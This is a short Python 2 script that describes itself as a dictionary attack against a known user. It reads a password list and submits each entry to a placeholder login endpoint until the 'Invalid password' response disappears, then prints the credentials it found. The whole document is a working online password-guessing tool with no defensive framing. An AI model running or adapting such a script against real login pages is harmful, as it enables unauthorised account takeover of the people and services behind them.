# This script is used for performing dictionary attack against known-users

import requests

URL = "URL/login"
FILENAME = "Dictionary_file.txt"

f = open(FILENAME, 'r+')
for line in f.readlines():
    data = {'username': "known-user", 'password':line.replace('\n','').replace('\r','')}
    r = requests.post(URL, data=data)
    print '[-]Testing user: "known-user & password: {0}'.format(line),
    # This condition depends of the response when you type wrong password
    if "Invalid password" not in r.content:
	print "[+] Credentials Found! --> User: 'known-user' & Password: {}".format(line.replace('\n','').replace('\r',''))
	break
